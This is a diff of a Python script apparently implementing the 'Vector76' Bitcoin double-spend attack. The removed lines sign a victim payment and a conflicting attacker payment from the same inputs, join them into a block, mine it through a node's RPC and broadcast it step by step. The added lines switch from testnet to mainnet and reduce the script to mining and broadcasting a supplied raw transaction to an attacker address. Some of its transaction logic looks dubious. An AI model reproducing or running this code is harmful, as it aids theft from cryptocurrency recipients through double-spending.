@@ -1,6 +1,5 @@
 import time
 import argparse
-import bitcoincli.client
 import requests
 import subprocess
 
@@ -8,10 +7,10 @@ from bitcoin import *
 from cryptos import *
 from datetime import datetime
 from hashlib import sha256
+from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
 from bitcoinaddress import Wallet
-import bitcoincli
 
-testnet = True #Network Option
+testnet = False #Network Option
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 parser.add_argument("node_host",
@@ -27,20 +26,11 @@ parser.add_argument("password",
                     help="public node password",
                     type=str)
 
-parser.add_argument("attacker_signkey",
-                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
-                    type=str)
-parser.add_argument("victim_address",
-                    help="victim address.",
-                    type=str)
 parser.add_argument("attacker_address",
                     help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
                     type=str)
-parser.add_argument("amount_of_coins",
-                    help="Amount of coins sent. (Enter in BTC units)",
-                    type=float)
-parser.add_argument("last_UXTO",
-                    help="Last UXTO of first attacker address",
+parser.add_argument("rawtx",
+                    help="rawtx",
                     type=str)
 
 def to_satoshi(btc_amount):
@@ -188,91 +178,17 @@ rpc_port = args.node_port
 username = args.username
 password = args.password
 
-key = args.attacker_signkey
-victim_address   = args.victim_address
 attacker_address = args.attacker_address
-last_txid  = args.last_UXTO
-amount_btc = args.amount_of_coins
-
+rawtx = args.rawtx
 
 fee = 15000
 transaction_util = Bitcoin(testnet=testnet)
 print("Connecting Public Node...")
-rpc_node = bitcoincli.Bitcoin(rpchost=rpc_host,
-                              rpcport=rpc_port,
-                              rpcuser=username,
-                              rpcpasswd=password)#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
+rpc_node = AuthServiceProxy(f"http://{username}:{password}@{rpc_host}:{rpc_port}")#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
 print(rpc_node.getblockchaininfo())
-print("OK")
-#key   = transaction_util.encode_privkey(key, "wif")
-send_amount = to_satoshi(amount_btc)
-inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
-print(inputs)
-tx_victim = [{"address": victim_address, "value": send_amount}]
-tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
-tx_victim["outs"][0]["value"] = -tx_victim["outs"][0]["value"]
-print(tx_victim)
-tx_victim = serialize(transaction_util.signall(tx_victim, key))
-tx_attacker = [{"address": attacker_address, "value": send_amount}]
-tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
-tx_attacker["outs"][0]["value"] = tx_attacker["outs"][0]["value"]
-tx_attacker = serialize(transaction_util.signall(tx_attacker, key))
+broadcast_transaction(rawtx, testnet)
 print()
-print()
-tx_vector76 = f"{tx_attacker}{tx_victim}"
-print("Mining Vector76 Block...")
-rpc_node.sendrawtransaction(tx_vector76)
-rpc_node.generateblock(f'"{attacker_address}",["{tx_vector76}"],false')
-#result = rpc_node.sendrawtransaction(f"['{vector76_tx}']")
-print("--------------------")
-print(f"Victim      : {victim_address}")
-print(f"Attacker    : {attacker_address}")
-print(f"Send Amount (Satoshi unit)    : {send_amount} Satoshi")
-print(f"Fee Amount  (Satoshi unit)    : {fee} Satoshi")
-print(f"Signed V1 RawTx           : {tx_victim}")
-print(f"Signed V2 RawTx           : {tx_attacker}")
-print(f"Vector76  Block           : {tx_vector76}")
-print("--------------------")
-print()
-print()
-print("[+] READY...")
-print()
-input(" --- Press the enter key to continue the Vector76 attack... --- ")
-#print(amount_satoshi)
-print()
-print("OK")
-print("push V1 TX...")
-broadcast_transaction(tx_victim, testnet)
-#print()
-input("--- Send the block after pressing the enter key. --- ")
-print(f"Broadcast Vector76 Block...")
-broadcast_transaction(tx_vector76, testnet)
-#broadcast_transaction(tx_attacker, testnet)
-#rpc_node.submitblock(f"'{tx_vector76}'")
-#transaction_util.pushtx(vector76_tx)
-#transaction_util.pushtx(vector76_block)
-#vector76_block = rpc_node.submitblock(f'{vector76_tx}')
-#miner = Wallet()
-#print(miner)
-#print(f"Submit Vector76 Block...   : {vector76_block}")
-#print()
-#result = rpc_node.submitblock(vector76_block)
-#print(f"Vector76 rawtx: {vector76_tx}")
-print()
-#おまけ
-print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
-print()
-
-sound_name = "ImagineBreaker.mp3"
-try:
-    import mp3play
-    clip = mp3play.load(sound_name)
-    clip.play()
-    time.sleep(min(5, clip.seconds()))
-    clip.stop()
-except:
-    # Termux Only
-    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
-    subprocess.run(imagine_breaker_cmd)
-
-print("Done.")
+result = rpc_node.generateblock(f'"{attacker_address}" ["{rawtx}"]')
+print(result)
+broadcast_transaction(rawtx, testnet)
+print("done")
